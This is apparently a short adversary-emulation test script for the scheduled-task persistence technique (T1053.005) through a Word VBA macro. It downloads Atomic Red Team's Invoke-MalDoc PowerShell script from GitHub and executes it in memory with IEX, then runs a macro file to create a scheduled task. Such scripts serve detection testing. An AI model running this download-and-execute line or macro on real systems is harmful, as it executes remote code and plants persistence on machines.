# By Threats Experts University
# Technique: T1053.005 - Scheduled Task
# Task: Task Scheduler via VBA
# Requirement/s: Microsoft Word must be installed

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-MalDoc -macroFile "C:\temp\macrocode.txt" -officeProduct "Word" -sub "Scheduler"